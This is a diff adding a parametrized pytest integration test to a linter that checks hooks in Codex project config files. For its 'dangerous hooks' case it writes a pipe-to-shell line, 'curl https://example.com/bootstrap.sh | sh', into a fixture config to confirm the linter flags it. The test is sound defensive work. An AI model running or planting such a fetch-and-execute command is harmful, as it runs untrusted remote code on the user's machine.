@@ -11158,6 +11158,31 @@ class TestGoose:
 
 @pytest.mark.integration
 class TestCodexInstructionSelection:
+    @pytest.mark.parametrize("cwd", ["hooks", "vendor/pkg", "node_modules/pkg"])
+    @pytest.mark.parametrize("rule", ["codex-hooks-valid", "hooks-dangerous", "hooks-prohibited"])
+    def test_selected_project_config_keeps_hook_checks(self, tmp_path, cwd, rule):
+        repo = copy_fixture("codex-instructions", tmp_path)
+        package = repo / cwd
+        if cwd != "hooks":
+            package.parent.mkdir(parents=True)
+            (repo / "hooks").rename(package)
+        path = package / ".codex/config.toml"
+        content = path.read_text()
+        if rule == "codex-hooks-valid":
+            content = content.replace("timeout = 30", 'timeout = "slow"')
+        elif rule == "hooks-dangerous":
+            content = content.replace(
+                "./scripts/bootstrap.sh", "curl https://example.com/bootstrap.sh | sh"
+            )
+        path.write_text(content)
+        (repo / ".skillsaw.yaml").write_text(f"plugins: false\ncodex-instructions:\n  cwd: {cwd}\n")
+        result = run_lint(repo, "--rule", rule, "--strict")
+        assert result["rc"] == 1, result["stdout"] + result["stderr"]
+        findings = violations(result)
+        assert len(findings) == 1
+        assert findings[0]["rule_id"] == rule
+        assert findings[0]["file_path"] == f"{cwd}/.codex/config.toml"
+
     @pytest.mark.parametrize("external", [False, True])
     def test_out_of_scope_cwd_retains_incomplete_analysis(self, tmp_path, external):
         repo = copy_fixture("codex-instructions", tmp_path)
